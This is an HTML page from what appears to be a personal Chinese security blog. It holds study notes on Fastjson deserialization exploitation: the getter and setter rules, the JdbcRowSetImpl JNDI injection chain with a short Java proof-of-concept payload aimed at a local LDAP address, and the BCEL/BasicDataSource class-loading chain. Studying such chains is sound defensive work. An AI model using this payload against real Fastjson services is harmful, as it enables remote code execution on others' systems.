@@ -1,0 +1,226 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>fastjson学习 | 墨水彩笔</title><meta name="author" content="墨水彩笔"><meta name="copyright" content="墨水彩笔"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="​     parse执行set方法 利用parseObject时其中有tojson调用get方法 通过反射调用get方法获取值，相应的就是通过反射调用set方法存储值 parse进行反序列化，因此json字符串中有@type因此会自动执行指定类的set方法，并且会转换为@type指定类的类型 parseObject进行反序列话时会自动执行@type指定类的get和set方法，并且转换为JSONO">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson学习">
+<meta property="og:url" content="http://example.com/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="墨水彩笔">
+<meta property="og:description" content="​     parse执行set方法 利用parseObject时其中有tojson调用get方法 通过反射调用get方法获取值，相应的就是通过反射调用set方法存储值 parse进行反序列化，因此json字符串中有@type因此会自动执行指定类的set方法，并且会转换为@type指定类的类型 parseObject进行反序列话时会自动执行@type指定类的get和set方法，并且转换为JSONO">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2023-04-07T06:16:22.000Z">
+<meta property="article:modified_time" content="2023-05-07T06:17:01.853Z">
+<meta property="article:author" content="墨水彩笔">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2023-05-07 14:17:01'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">82</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">1.</span> <span class="toc-text">调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%E8%BF%9C%E7%A8%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.1.</span> <span class="toc-text">JNDI远程类加载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91"><span class="toc-number">1.1.1.</span> <span class="toc-text">触发</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.2.</span> <span class="toc-text">本地类加载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%93%BE%E6%9D%A1%E5%87%BA%E5%8F%A3"><span class="toc-number">1.2.1.</span> <span class="toc-text">链条出口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%93%BE%E6%9D%A1%E5%85%A5%E5%8F%A3"><span class="toc-number">1.2.2.</span> <span class="toc-text">链条入口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">触发</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-25"><span class="toc-number">2.</span> <span class="toc-text">1.2.25</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.1.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">fastjson学习</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-04-07T06:16:22.000Z" title="Created 2023-04-07 14:16:22">2023-04-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-05-07T06:17:01.853Z" title="Updated 2023-05-07 14:17:01">2023-05-07</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><p>​    </p>
+<p>parse执行set方法</p>
+<p>利用parseObject时其中有tojson调用get方法</p>
+<p><strong>通过反射调用get方法获取值，相应的就是通过反射调用set方法存储值</strong></p>
+<p>parse进行反序列化，因此json字符串中<strong>有<code>@type</code>因此会自动执行指定类的set方法</strong>，并且会转换为<code>@type</code>指定类的类型</p>
+<p><strong>parseObject进行反序列话时会自动执行<code>@type</code>指定类的get和set方法</strong>，并且转换为<code>JSONObject</code>类</p>
+<p>变量有对应的setter或者public或者满足条件的getter，那么变量可控</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getter自动调用需要满足以下条件</span><br><span class="line"></span><br><span class="line">方法名长度大于4</span><br><span class="line">非静态方法</span><br><span class="line">以get开头且第四个字母为大写</span><br><span class="line">无参数传入</span><br><span class="line">返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</span><br><span class="line"></span><br><span class="line">setter自动调用需要满足以下条件</span><br><span class="line">方法名长度大于4</span><br><span class="line">非静态方法</span><br><span class="line">返回值为void或者当前类</span><br><span class="line">以set开头且第四个字母为大写</span><br><span class="line">参数个数为1个</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>getonly格式</p>
+<p>除此之外Fastjson还有以下功能点：</p>
+<ol>
+<li>如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用<code>Feature.SupportNonPublicField</code>参数</li>
+<li>fastjson 在为类属性寻找getter/setter方法时，调用函数<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>方法，会忽略<code>_ -</code>字符串</li>
+<li>fastjson 在反序列化时，如果Field类型为byte[]，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code>进行base64解码，在序列化时也会进行base64编码</li>
+</ol>
+<p>漏洞利用是通过找到恶意的set方法，我们讲构造的类传入</p>
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="JNDI远程类加载"><a href="#JNDI远程类加载" class="headerlink" title="JNDI远程类加载"></a>JNDI远程类加载</h3><p>最基础的一条链</p>
+<p>JdbcRowSetImpl中存在原生lookup，标准的JNDI注入，jndi注入本质也是一种动态类加载</p>
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230414101256791.png" class title="image-20230414101256791">
+
+<p>因此如果我们能够控制getDataSourceName的话</p>
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230416165821369.png" class title="image-20230416165821369">
+
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230416165903444.png" class title="image-20230416165903444">
+
+<p>那么在fastjson中如何控制变量呢，需要对应的变量有Setter或者Public或者是满足条件的getter</p>
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230416170136754.png" class title="image-20230416170136754">
+
+<p>通过查看发现该变量存在setter方法，因此变量可控</p>
+<p>那么我们回过头去找，lookup在connet中被调用，那么谁调用了connet，发现存在两处调用，但需要注意的是getter方法如果不满足四个特殊return变量的话，除非利用toJson进行调用，否则无法触发，因此这里选择set方法</p>
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230416170352628.png" class title="image-20230416170352628">
+
+<p>并且注意我们的get方法必须满足以下四种类变量可控</p>
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230414101806964.png" class title="image-20230414101806964">
+
+<p>setAutoCommit</p>
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230416170524260.png" class title="image-20230416170524260">
+
+
+
+<p>在编写poc的时候需要注意的是我们需要的是方法名，可以去掉set字样</p>
+<p>那么我们就构造下利用链条</p>
+<p>@type–触发特定类setter/getter方法–&gt;触发setAutoCommit方法调用connet–&gt;调用原生lookup–&gt;JNDI注入</p>
+<h4 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h4><p>缺点，需要出网，受版本和依赖限制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class JSONUnser &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String s &#x3D; &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap:&#x2F;&#x2F;127.0.0.1:8085&#x2F;XuHZesyP\&quot;,\&quot;autoCommit\&quot;:\&quot;false\&quot;&#125;&quot;;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="本地类加载"><a href="#本地类加载" class="headerlink" title="本地类加载"></a>本地类加载</h3><h4 id="链条出口"><a href="#链条出口" class="headerlink" title="链条出口"></a>链条出口</h4><p>利用Bcel类中存在ClassLoad</p>
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230416172541732.png" class title="image-20230416172541732">
+
+<p>当我们的前缀与$$BCEL$$匹配后可以存在defineClass</p>
+<p>但需要注意的是createClass里面存在decode解密，那么我们传入的时候对应进行encode加密</p>
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230416220431611.png" class title="image-20230416220431611">
+
+<p>那么我们这时候就需要找哪里能够触发我们的ClassLoad中的loadClass</p>
+<h4 id="链条入口"><a href="#链条入口" class="headerlink" title="链条入口"></a>链条入口</h4><p>此时找到另一个类BasicDataSource</p>
+<p>如果driverClassName不为空，会调用forName，如果driverClassName存在setter或者getter方法，那么就可以实现控制</p>
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230416214500226.png" class title="image-20230416214500226">
+
+<p>查找其调用方法</p>
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230416214838442.png" class title="image-20230416214838442">
+
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230416214848822.png" class title="image-20230416214848822">
+
+<p>发现都存在相应set方法，那么这个变量可控如果我们这个方法的它之前的调用也存在getter或者setter那么就可以实现链条的拼凑</p>
+<p>找到其调用方法中的createDataSource存在对应方法</p>
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230416215946058.png" class title="image-20230416215946058"> 
+
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230416220059678.png" class title="image-20230416220059678">
+
+<h4 id="触发-1"><a href="#触发-1" class="headerlink" title="触发"></a>触发</h4><p>那么我们综上的触发思路就是利用BasicDataSource里面的forname来首先调用LoadClass,然后触发恶意类</p>
+<p>BasicDataSource–&gt;通过setter方法修改forname参数–&gt;调用LoadClass–&gt;触发恶意类</p>
+<h2 id="1-2-25"><a href="#1-2-25" class="headerlink" title="1.2.25"></a>1.2.25</h2><p>如果此时再使用之前版本的利用链会报错</p>
+<img src="/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/04/07/fastjson%E5%AD%A6%E4%B9%A0/image-20230414150101398.png" class title="image-20230414150101398">
+
+<p>因为此时存在黑名单+白名单,多了一个check</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;kingx.me&#x2F;Exploit-FastJson-Without-Reverse-Connect.html</span><br></pre></td></tr></table></figure>
+
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">墨水彩笔</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/">http://example.com/2023/04/07/fastjson%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/11/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-1/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">春秋云镜-1</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">进阶免杀1.0</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 墨水彩笔</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
